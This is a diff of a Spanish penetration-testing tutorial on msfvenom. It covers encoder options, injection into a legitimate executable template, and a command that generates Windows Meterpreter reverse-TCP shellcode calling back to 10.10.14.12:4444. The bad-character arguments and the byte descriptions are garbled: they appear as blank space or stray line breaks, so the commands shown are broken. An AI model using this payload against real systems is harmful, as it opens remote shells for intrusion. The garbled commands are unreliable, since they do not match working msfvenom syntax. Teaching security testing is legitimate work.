@@ -284,7 +284,8 @@ La sintaxis fundamental de un comando `msfvenom` requiere la selección de la ca
 | `-e` | Selecciona el codificador para transformar la carga útil | `-e x86/shikata_ga_nai` |
 | `-i` | Define el número de iteraciones de codificación | `-i 5` |
 | `-b` | Especifica la lista de caracteres prohibidos (*Bad Chars*) | `-b ' 
-'` |
+
+'` |
 | `-x` | Define una plantilla ejecutable legítima para inyección | `-x putty.exe` |
 | `-k` | Preserva el hilo de ejecución original de la plantilla | `-k` (se usa en combinación con `-x`) |
 | `-a` | Fuerza la arquitectura de procesamiento | `-a x64` o `-a x86` |
@@ -336,7 +337,8 @@ Los formatos de salida de `msfvenom` se dividen en dos categorías:
 
 **Shellcode C para exploits de desbordamiento de búfer:**
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4444 -b ' 
-' -f c`
+
+' -f c`
 
 | Escenario de Entrega | Payload Recomendado | Formato (`-f`) |
 | :--- | :--- | :--- |
@@ -354,8 +356,10 @@ Existe el concepto erróneo de que la codificación con `msfvenom` permite eludi
 
 La utilidad técnica legítima de los codificadores se limita a:
 En primer lugar, sirve para **Eliminar caracteres prohibidos (*Bad Characters*):** Cuando un vector de ataque (como un desbordamiento de búfer en una función de cadena C) se corrompe si la carga útil contiene bytes nulos (` `), saltos de línea (`
-`) o retornos de carro (``). La bandera `-b ' 
-'` fuerza a `msfvenom` a codificar el binario omitiendo esos bytes.
+`) o retornos de carro (`
+`). La bandera `-b ' 
+
+'` fuerza a `msfvenom` a codificar el binario omitiendo esos bytes.
 En segundo lugar, permite el **Ajuste de formato:** Garantizar que la carga útil cumpla restricciones de conjunto de caracteres (por ejemplo, caracteres ASCII imprimibles).
 
 ### 4.5. Inyección en Binarios y Payloads Multiplataforma
